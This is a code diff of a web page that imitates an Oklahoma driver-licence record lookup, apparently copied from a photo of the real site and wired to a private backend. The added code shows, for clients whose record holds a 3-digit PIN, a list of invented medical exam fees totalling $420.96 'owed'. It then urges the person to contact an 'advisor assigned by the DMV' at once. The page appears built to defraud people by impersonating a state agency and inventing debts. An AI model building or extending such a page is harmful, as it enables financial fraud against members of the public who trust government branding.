@@ -21,7 +21,7 @@
         .animate-fade { animation: fadeIn 0.4s ease-out; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Estilos específicos para la página de Oklahoma (como en la foto) */
+        /* Estilos Oklahoma */
         .oklahoma-header {
             background: #002664;
             border-bottom: 4px solid #ffc425;
@@ -50,6 +50,26 @@
             font-weight: 600;
             border-bottom: 1px solid #e5e7eb;
         }
+        /* Estilos para la sección de restricciones */
+        .restrictions-card {
+            background: #fff3e0;
+            border-left: 6px solid #e67e22;
+            transition: all 0.3s ease;
+        }
+        .restrictions-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px dashed #f0c48b;
+        }
+        .total-amount {
+            background: #e67e22;
+            color: white;
+            padding: 12px;
+            border-radius: 16px;
+            font-weight: 900;
+            text-align: center;
+        }
     </style>
 </head>
 <body class="bg-slate-50 text-slate-900">
@@ -69,7 +89,7 @@
         </div>
     </header>
 
-    <!-- ======================== HOME TAB ======================== -->
+    <!-- HOME TAB -->
     <main id="tab-home" class="animate-fade">
         <section class="global-hero-bg text-white py-32 px-6 text-center">
             <h2 class="text-4xl md:text-7xl font-black mb-6 italic uppercase leading-tight">Expert Solutions <br> <span class="text-blue-500 text-3xl md:text-5xl italic">For Your Peace of Mind</span></h2>
@@ -97,7 +117,7 @@
         </section>
     </main>
 
-    <!-- ======================== TRUST TAB ======================== -->
+    <!-- TRUST TAB -->
     <main id="tab-trust" class="hidden animate-fade global-hero-bg min-h-screen flex items-center">
         <section class="container mx-auto py-24 px-6 text-white">
             <div class="text-center mb-16">
@@ -132,7 +152,7 @@
         </section>
     </main>
 
-    <!-- ======================== ADVISORS TAB ======================== -->
+    <!-- ADVISORS TAB -->
     <main id="tab-advisors" class="hidden animate-fade global-hero-bg min-h-screen flex items-center">
         <section class="py-24 px-6 text-center w-full">
             <div class="container mx-auto">
@@ -159,7 +179,7 @@
         </section>
     </main>
 
-    <!-- ======================== VERIFICATION TAB ======================== -->
+    <!-- VERIFICATION TAB -->
     <main id="tab-verify" class="hidden container mx-auto px-6 py-16 animate-fade">
         <div class="max-w-5xl mx-auto space-y-10">
             <div class="bg-white p-10 rounded-[3rem] shadow-2xl border-t-[12px] border-blue-600 text-center">
@@ -173,15 +193,13 @@
         </div>
     </main>
 
-    <!-- ======================== PÁGINA DE RESULTADO ESTILO OKLAHOMA ======================== -->
+    <!-- PÁGINA DE RESULTADO ESTILO OKLAHOMA (con botón de restricciones condicional) -->
     <main id="tab-record" class="hidden bg-white min-h-screen">
         <div class="max-w-7xl mx-auto px-4 py-8">
-            <!-- Botón para volver a verificación -->
             <div class="mb-4 text-right">
                 <button onclick="showTab('verify')" class="text-sm font-bold text-blue-700 hover:underline"><i class="fas fa-arrow-left"></i> Back to Verification</button>
             </div>
 
-            <!-- Encabezado Oklahoma (exactamente como en la foto) -->
             <div class="oklahoma-header text-white rounded-t-2xl p-6 flex flex-col md:flex-row justify-between items-start md:items-center">
                 <div>
                     <h1 class="text-3xl font-black tracking-tight">OKLAHOMA SERVICE</h1>
@@ -192,9 +210,8 @@
                 </div>
             </div>
 
-            <!-- Contenido principal: dos columnas (sidebar + tabla) -->
             <div class="grid md:grid-cols-4 gap-8 mt-8">
-                <!-- Menú lateral izquierdo (exactamente como en la foto) -->
+                <!-- Sidebar izquierdo -->
                 <div class="md:col-span-1 bg-gray-50 p-5 rounded-2xl border border-gray-200">
                     <div class="space-y-1">
                         <h3 class="text-xs font-black uppercase text-gray-500 mb-3">Oklahoma Driver Licenses & ID</h3>
@@ -220,14 +237,13 @@
                     </div>
                 </div>
 
-                <!-- Área de contenido: tabla y detalles -->
+                <!-- Contenido principal -->
                 <div class="md:col-span-3 space-y-6">
-                    <!-- Etiqueta de "UPLOAD DOCUMENT" (como en la foto) -->
                     <div class="bg-blue-50 border-l-8 border-blue-600 p-4 rounded-xl">
                         <p class="text-sm font-black uppercase text-blue-800"><i class="fas fa-upload mr-2"></i> UPLOAD DOCUMENT (<span id="record-lastname">Cliente</span>)</p>
                     </div>
 
-                    <!-- Tabla principal (mismos campos que la foto) -->
+                    <!-- Tabla principal -->
                     <div class="bg-white rounded-2xl shadow-md overflow-hidden border border-gray-200">
                         <table class="w-full text-left ok-table">
                             <thead>
@@ -246,7 +262,7 @@
                         </table>
                     </div>
 
-                    <!-- Información adicional opcional (para mantener coherencia con el backend) -->
+                    <!-- Datos adicionales -->
                     <div class="grid md:grid-cols-2 gap-5">
                         <div class="bg-gray-50 p-5 rounded-2xl">
                             <p class="text-[10px] font-black uppercase text-gray-500">Date of Birth</p>
@@ -266,7 +282,31 @@
                         </div>
                     </div>
 
-                    <!-- Pie de página con redes sociales y copyright (exactamente como en la foto) -->
+                    <!-- 🆕 BOTÓN DE RESTRICCIONES (solo si el cliente tiene PIN de 3 dígitos) -->
+                    <div id="restrictions-button-container" class="hidden">
+                        <button id="btn-restrictions" class="w-full bg-orange-600 hover:bg-orange-700 text-white py-4 rounded-xl font-black uppercase tracking-wider transition shadow-lg flex items-center justify-center gap-3">
+                            <i class="fas fa-exclamation-triangle text-xl"></i> Ver Restricciones y Exámenes Médicos
+                        </button>
+                    </div>
+
+                    <!-- 🆕 SECCIÓN DE RESTRICCIONES (contenido que se muestra al hacer clic) -->
+                    <div id="restrictions-content" class="hidden restrictions-card p-6 rounded-2xl shadow-md">
+                        <h3 class="text-xl font-black uppercase text-orange-700 mb-4 flex items-center gap-2"><i class="fas fa-file-medical"></i> Exámenes médicos requeridos:</h3>
+                        <div class="space-y-2">
+                            <div class="restrictions-item"><span class="font-bold">Agudeza visual:</span> <span class="font-black">$105,24 USD</span></div>
+                            <div class="restrictions-item"><span class="font-bold">Examen auditivo:</span> <span class="font-black">$105,24 USD</span></div>
+                            <div class="restrictions-item"><span class="font-bold">Prueba antidoping (alcohol y drogas):</span> <span class="font-black">$105,24 USD</span></div>
+                            <div class="restrictions-item"><span class="font-bold">Examen de sangre:</span> <span class="font-black">$105,24 USD</span></div>
+                        </div>
+                        <div class="total-amount mt-5">
+                            Monto total adeudado: <span class="text-2xl block">$420,96 USD</span>
+                        </div>
+                        <div class="mt-6 p-4 bg-orange-100 rounded-xl text-orange-800 text-sm font-bold text-center">
+                            <i class="fas fa-phone-alt mr-2"></i> Se le solicita comunicarse de manera inmediata con el asesor asignado por el DMV para recibir información detallada sobre el procedimiento para regularizar su situación y completar los requisitos pendientes.
+                        </div>
+                    </div>
+
+                    <!-- Footer -->
                     <div class="border-t pt-6 mt-4 text-center text-gray-500 text-xs">
                         <div class="flex justify-center space-x-6 mb-3">
                             <i class="fab fa-facebook-f text-blue-700"></i>
@@ -286,7 +326,6 @@
     </footer>
 
     <script>
-        // Función para cambiar de pestaña
         function showTab(id) {
             document.querySelectorAll('main').forEach(m => m.classList.add('hidden'));
             const target = document.getElementById('tab-' + id);
@@ -303,7 +342,6 @@
             window.scrollTo(0,0);
         }
 
-        // Formatear fecha (de YYYY-MM-DD a DD MMM YYYY)
         function formatDate(dateStr) {
             if (!dateStr) return 'N/A';
             const [y, m, d] = dateStr.split('-');
@@ -312,7 +350,6 @@
             return `${d} ${months[parseInt(m)-1]} ${y}`;
         }
 
-        // Función principal de verificación (consulta a tu backend server.js.js)
         async function handleVerify(e) {
             e.preventDefault();
             const nameInput = document.getElementById('v-name').value;
@@ -329,7 +366,7 @@
                 if (data.success && data.datos) {
                     const d = data.datos;
 
-                    // Rellenar la tabla y los campos de la página estilo Oklahoma
+                    // Llenar campos básicos
                     document.getElementById('record-code').textContent = d.id_cliente || '---';
                     document.getElementById('record-fullname').textContent = d.nombre || '---';
                     document.getElementById('record-type').textContent = d.tipo_licencia || '---';
@@ -340,14 +377,37 @@
                     document.getElementById('record-dob').textContent = formatDate(d.fecha_nacimiento);
                     document.getElementById('record-state').textContent = d.estado || 'OKLAHOMA';
                     
-                    // Construir campo Sexo / Altura / Peso
                     const sexo = d.sexo || 'N/A';
                     const altura = d.estatura || 'N/A';
                     const peso = d.peso || 'N/A';
                     document.getElementById('record-physical').textContent = `${sexo} / ${altura} / ${peso}`;
                     document.getElementById('record-address').textContent = d.direccion || 'NOT REGISTERED';
 
-                    // Mostrar la página de resultado
+                    // 🆕 Lógica del PIN de 3 dígitos
+                    const pin = d.pin ? d.pin.toString() : null;
+                    const hasValidPin = pin && /^\d{3}$/.test(pin); // exactamente 3 dígitos
+                    const btnContainer = document.getElementById('restrictions-button-container');
+                    const restrictionsDiv = document.getElementById('restrictions-content');
+                    
+                    if (hasValidPin) {
+                        // Mostrar el botón
+                        btnContainer.classList.remove('hidden');
+                        // Asegurar que la sección de restricciones esté oculta inicialmente
+                        restrictionsDiv.classList.add('hidden');
+                        
+                        // Agregar evento al botón (si ya tiene uno, lo reemplazamos)
+                        const btn = document.getElementById('btn-restrictions');
+                        // Remover eventos anteriores clonando o simplemente asignando nuevo
+                        const newBtn = btn.cloneNode(true);
+                        btn.parentNode.replaceChild(newBtn, btn);
+                        newBtn.addEventListener('click', () => {
+                            restrictionsDiv.classList.toggle('hidden');
+                        });
+                    } else {
+                        btnContainer.classList.add('hidden');
+                        restrictionsDiv.classList.add('hidden');
+                    }
+
                     showTab('record');
                 } else {
                     alert("RECORD NOT FOUND.\nVerifica que el nombre y el folio sean correctos.");
